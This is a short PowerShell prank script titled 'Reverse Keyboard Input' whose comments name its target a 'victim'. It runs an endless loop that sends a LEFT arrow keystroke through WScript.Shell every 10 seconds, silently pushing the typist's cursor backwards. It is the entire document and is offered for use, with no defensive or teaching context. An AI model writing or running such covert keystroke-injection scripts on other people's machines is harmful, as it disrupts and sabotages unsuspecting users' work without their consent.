# Reverse Keyboard Input
# Sends a LEFT arrow keystroke every 10 seconds while the victim is typing,
# silently nudging their cursor backwards.
$wshell = New-Object -ComObject wscript.shell

while ($true) {
    Start-Sleep -Seconds 10
    $wshell.SendKeys("{LEFT}")
}
